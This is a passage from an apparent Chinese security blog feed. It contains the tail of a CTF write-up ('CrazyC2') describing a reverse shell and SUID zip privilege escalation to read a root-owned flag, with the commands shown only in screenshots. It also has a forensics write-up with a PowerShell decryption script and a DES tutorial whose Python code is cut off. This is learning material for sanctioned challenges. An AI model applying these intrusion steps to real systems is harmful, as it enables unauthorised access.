aria-hidden="true">image-20240402180037287</figcaption></figure><p>有点问题，那么就先把前面的tmux进程kill了再启动，根据它给的id和key改一下server.py，kill了再启动</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180438620.png"alt="image-20240402180438620" /><figcaption aria-hidden="true">image-20240402180438620</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180615128.png"alt="image-20240402180615128" /><figcaption aria-hidden="true">image-20240402180615128</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402180708976.png"alt="image-20240402180708976" /><figcaption aria-hidden="true">image-20240402180708976</figcaption></figure><p>输指令反弹shell</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/屏幕截图-2024-04-02-180909.png"alt="屏幕截图 2024-04-02 180909" /><figcaption aria-hidden="true">屏幕截图 2024-04-02 180909</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181031310.png"alt="image-20240402181031310" /><figcaption aria-hidden="true">image-20240402181031310</figcaption></figure><p>可以看到现在的用户是ctf，但是flag在/root/flag.txt下，需要提权</p><p>这里用suid提权，先看一下哪些文件有suid权限</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181207616.png"alt="image-20240402181207616" /><figcaption aria-hidden="true">image-20240402181207616</figcaption></figure><p>在<ahref="https://gtfobins.github.io/gtfobins/zip/">gtfobins</a>上面查到可以利用/usr/bin/zip提权读取文件，以此得到第二个flag</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181337524.png"alt="image-20240402181337524" /><figcaption aria-hidden="true">image-20240402181337524</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181431988.png"alt="image-20240402181431988" /><figcaption aria-hidden="true">image-20240402181431988</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 Wrong Direction!</title>
      <link href="/posts/ff8462d1/"/>
      <url>/posts/ff8462d1/</url>
      
        <content type="html"><![CDATA[<p>这次不用volatility2了，试试volatility3</p><p>filescan一下，在桌面上看到个叫成绩单的表格</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328132138952.png"alt="image-20240328132138952" /><figcaption aria-hidden="true">image-20240328132138952</figcaption></figure><p>把它dump下来</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328132551305.png"alt="image-20240328132551305" /><figcaption aria-hidden="true">image-20240328132551305</figcaption></figure><p>在这张表格的第275行发现了一串powershell命令</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328194801457.png"alt="image-20240328194801457" /><figcaption aria-hidden="true">image-20240328194801457</figcaption></figure><p>那么就去查看一下powershell的evtx日志文件。powershell的日志文件主要有PowerShell.evtx，PowershellOperational.evtx，Powershell Admin.evtx三种，这里在PowershellOperational.evtx中可以找到执行的命令记录</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328200431086.png"alt="image-20240328200431086" /><figcaption aria-hidden="true">image-20240328200431086</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328195639155.png"alt="image-20240328195639155" /><figcaption aria-hidden="true">image-20240328195639155</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328195922747.png"alt="image-20240328195922747" /><figcaption aria-hidden="true">image-20240328195922747</figcaption></figure><p>可以看到有两串Scriptblock文本，把它们合起来</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328200118331.png"alt="image-20240328200118331" /><figcaption aria-hidden="true">image-20240328200118331</figcaption></figure><p>可以看到所有的变量名都经过了混淆，手动改回去</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328200218045.png"alt="image-20240328200218045" /><figcaption aria-hidden="true">image-20240328200218045</figcaption></figure><p>这下看起来舒服多了(</p><p>可以看见最终的密文被输入到了一个叫做text.txt的文件中，去找找，dump一下</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328200502193.png"alt="image-20240328200502193" /><figcaption aria-hidden="true">image-20240328200502193</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328200611602.png"alt="image-20240328200611602" /><figcaption aria-hidden="true">image-20240328200611602</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328200642356.png"alt="image-20240328200642356" /><figcaption aria-hidden="true">image-20240328200642356</figcaption></figure><p>接下来就是写个ps1脚本进行解密，由于不熟悉powershell，废了好大功夫。。。</p><p>exp:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hash</span><span class="params">(<span class="variable">$text</span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$md5</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Security.Cryptography.MD5CryptoServiceProvider</span><br><span class="line">    <span class="variable">$utf8</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.UTF8Encoding</span><br><span class="line">    <span class="variable">$hash</span> = [<span class="type">System.BitConverter</span>]::ToString(<span class="variable">$md5</span>.ComputeHash(<span class="variable">$utf8</span>.GetBytes(<span class="variable">$text</span>))).replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>).ToLower()</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hash</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decode</span><span class="params">(<span class="variable">$cypherText</span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$numbers</span> = [<span class="built_in">string</span>]::Join(<span class="string">&quot;&quot;</span>, ([<span class="type">regex</span>]::Matches(<span class="variable">$k3y</span>, <span class="string">&quot;\d+&quot;</span>)).Value)</span><br><span class="line">    <span class="variable">$seed</span> = [<span class="built_in">int</span>]<span class="variable">$numbers</span>.Substring(<span class="number">0</span>,<span class="number">5</span>)</span><br><span class="line">    <span class="variable">$rand</span> = <span class="built_in">New-Object</span> System.Random(<span class="variable">$seed</span>)</span><br><span class="line">    <span class="variable">$bytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$cypherText</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable">$keyposition</span> = <span class="number">0</span></span><br><span class="line">    <span class="variable">$decryptedText</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$byte</span> <span class="keyword">in</span> <span class="variable">$bytes</span>) &#123;</span><br><span class="line">        <span class="variable">$decryptedChar</span> = [<span class="built_in">char</span>](<span class="variable">$byte</span> <span class="operator">-bxor</span> (<span class="variable">$rand</span>.Next()%<span class="number">256</span>))</span><br><span class="line">        <span class="variable">$decryptedText</span> += <span class="variable">$decryptedChar</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decryptedText</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decode2</span><span class="params">(<span class="variable">$pass</span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span> = [<span class="built_in">Byte</span>[]](<span class="variable">$pass</span>.PadRight(<span class="number">24</span>).Substring(<span class="number">0</span>,<span class="number">24</span>).ToCharArray())</span><br><span class="line">    <span class="variable">$secureString</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-String</span> <span class="variable">$d</span> <span class="literal">-Key</span> <span class="variable">$key</span></span><br><span class="line">    <span class="variable">$decryptedText</span> = [<span class="type">Runtime.InteropServices.Marshal</span>]::PtrToStringAuto([<span class="type">Runtime.InteropServices.Marshal</span>]::SecureStringToBSTR(<span class="variable">$secureString</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decryptedText</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Script:key</span> = <span class="string">&quot;MyS3cr37K3y1sH3r3101&quot;</span></span><br><span class="line"><span class="variable">$Script:k3y</span> = Hash(<span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$text</span>=<span class="string">&quot;&quot;</span>   <span class="comment">#这里填入密文</span></span><br><span class="line"><span class="variable">$Script:d</span>=(Decode(<span class="variable">$text</span>))</span><br><span class="line">Decode2(<span class="variable">$k3y</span>)</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328201823496.png"alt="image-20240328201823496" /><figcaption aria-hidden="true">image-20240328201823496</figcaption></figure><p>看到这个熟悉的504B的开头，就知道是我们最爱的zip了</p><p>放进010editor或者其他什么二进制编辑器，保存为zip文件</p><p>虽然这个zip文件好像有些损坏，但是并没有伤及要害，仍然可以解压(</p><p>于是，得flag</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-Wrong-Direction!/image-20240328202122988.png"alt="image-20240328202122988" /><figcaption aria-hidden="true">image-20240328202122988</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2024 Writeup</title>
      <link href="/posts/f3024426/"/>
      <url>/posts/f3024426/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/NKCTF2024Writeup.pdf">Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/posts/966f3dbe/"/>
      <url>/posts/966f3dbe/</url>
      
        <content type="html"><![CDATA[<p>参考了<ahref="https://blog.csdn.net/weixin_52553215/article/details/124215865">这篇文章</a></p><h2 id="简述">简述</h2><p>DES（Data EncryptionStandard）是一种对称加密算法，它将64位的明文分成64位的块，并使用64位的密钥来进行加密操作。虽然DES本身只能处理64位的数据块，但是可以通过分组密码模式（如ECB、CBC、CFB、OFB、CTR等）来加密更长的数据。</p><h2 id="初始置换">初始置换</h2><p>输入明文M（64位），根据下表进行初始置换，得到IP</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">60,52,44,36,28,20,12,4,</span><br><span class="line">62,54,46,38,30,22,14,6,</span><br><span class="line">64,56,48,40,32,24,16,8,</span><br><span class="line">57,49,41,33,25,17, 9,1,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">61,53,45,37,29,21,13,5,</span><br><span class="line">63,55,47,39,31,23,15,7,</span><br></pre></td></tr></table></figure><p>如将M的第58位填入IP的第一位。</p><p>然后将IP平分为两段，L0和R0</p><h2 id="生成子密钥">生成子密钥</h2><p>一图以概之</p><p><img src="/images/DES加密/4433f1aedb9f4df98c7cbb7a783a7bda.png" alt="4433f1aedb9f4df98c7cbb7a783a7bda" style="zoom: 80%;" /></p><p>首先，一开始输入的64位key按照下表进行转换，生成56位密钥（置换选择1）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">57,49,41,33,25,17,9,1,</span><br><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">60,52,44,36,63,55,47,39,</span><br><span class="line">31,23,15,7,62,54,46,38,</span><br><span class="line">30,22,14,6,61,53,45,37,</span><br><span class="line">29,21,13,5,28,20,12,4</span><br></pre></td></tr></table></figure><p>实际上，这里只从原始密钥中取了56位进行变换，原始密钥中每字节的最高位是没有被使用的。</p><p>得到子密钥（56位）后，将变换后的子密钥分成两部分，C0和D0</p><p>得到C0和D0后，分别进行循环左移位操作，得到C1<sub>C16和D1</sub>D16的值，每一次循环移位的位数如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1</span><br></pre></td></tr></table></figure><p>如C0=1111000011001100101010101111</p><p>C1=1110000110011001010101011111</p><p>C2=1100001100110010101010111111</p><p>将每组Cn和Dn组合起来，得到十六组数据再次按照下表进行替换，得到K1~K16（置换选择2）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">14,17,11,24,1,5,</span><br><span class="line">3,28,15,6,21,10,</span><br><span class="line">23,19,12,4,26,8,</span><br><span class="line">16,7,27,20,13,2,</span><br><span class="line">41,52,31,37,47,55,</span><br><span class="line">30,40,51,45,33,48,</span><br><span class="line">44,49,39,56,34,53,</span><br><span class="line">46,42,50,36,29,32</span><br></pre></td></tr></table></figure><h2 id="轮函数">轮函数</h2><p>对上面初始置换中得到的L0和R0，我们在这里进行16轮加密变换，下面的图<del>（嫖来的）</del>描述了这个流程，其中函数f后面会叙述</p><figure><img src="/images/DES加密/2e1e54d0330a4d21a4aeada39bd0ca72.png"alt="2e1e54d0330a4d21a4aeada39bd0ca72" /><figcaptionaria-hidden="true">2e1e54d0330a4d21a4aeada39bd0ca72</figcaption></figure><p>由图知，L0通过与f函数运算后的结果进行异或后成为了R1，R0直接用作L1</p><p>下面是对f函数实现过程的具体描述</p><figure><img src="/images/DES加密/01d6b86ae2844e53b304002dc3c36db2.png"alt="01d6b86ae2844e53b304002dc3c36db2" /><figcaptionaria-hidden="true">01d6b86ae2844e53b304002dc3c36db2</figcaption></figure><h3 id="扩充置换">扩充/置换：</h3><p>此处的32位Rn先进行扩充置换变成了48位（因为我们需要将其与48位的子密钥异或）。</p><h3 id="与密钥异或">与密钥异或</h3><p>在扩充后，与之前生成的对应轮数的子密钥Kn进行异或运算</p><h3 id="代换选择">代换/选择</h3><p>将48位的数据转换为32位。这一步是整个DES算法的核心，简称S盒。</p><h4 id="s盒">S盒</h4><figure><img src="/images/DES加密/e6cccba809c648ad96d79f2119b1d083.png"alt="e6cccba809c648ad96d79f2119b1d083" /><figcaptionaria-hidden="true">e6cccba809c648ad96d79f2119b1d083</figcaption></figure><p>对于每个S盒，对照着4行16列的表，6比特输入中的第1比特和第6比特组成的二进制数来确定行，中间4位二进制数来确定列，对应行、列位置的十进制数的4位二进制数表示作为输出。</p><h3 id="置换">置换</h3><p>经过置换表进行置换</p><h3 id="异或">异或</h3><p>与对应环节的Ln进行异或</p><h2 id="交换">交换</h2><p>将L16和R16位置交换</p><h2 id="逆初始置换">逆初始置换</h2><p><strong>这里的置换方式与前面的不一样！</strong></p><p>这里的方式与前面的都恰好相反。</p><p>例如：</p><p>原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40,8,48,16,56,24,64,32,</span><br><span class="line">39,7,47,15,55,23,63,31,</span><br><span class="line">38,6,46,14,54,22,62,30,</span><br><span class="line">37,5,45,13,53,21,61,29,</span><br><span class="line">36,4,44,12,52,20,60,28,</span><br><span class="line">35,3,43,11,51,19,59,27,</span><br><span class="line">34,2,42,10,50,18,58,26,</span><br><span class="line">33,1,41,9,49,17,57,25</span><br></pre></td></tr></table></figure><p>至此可以得到密文C</p><h2 id="代码实现">代码实现</h2><p>参考了<ahref="https://blog.csdn.net/weixin_44034444/article/details/121055630">这篇文章</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrangeSimpleDES</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 出初始化DES加密的参数</span></span><br><span class="line">        self.ip = [</span><br><span class="line">            <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">            <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">        ]  <span class="comment"># ip置换</span></span><br><span class="line"> </span><br><span class="line">        self.ip1 = [</span><br><span class="line">            <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">            <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># 逆ip置换</span></span><br><span class="line">        self.E = [</span><br><span class="line">            <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">            <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">            <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">            <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">28</span>, <span 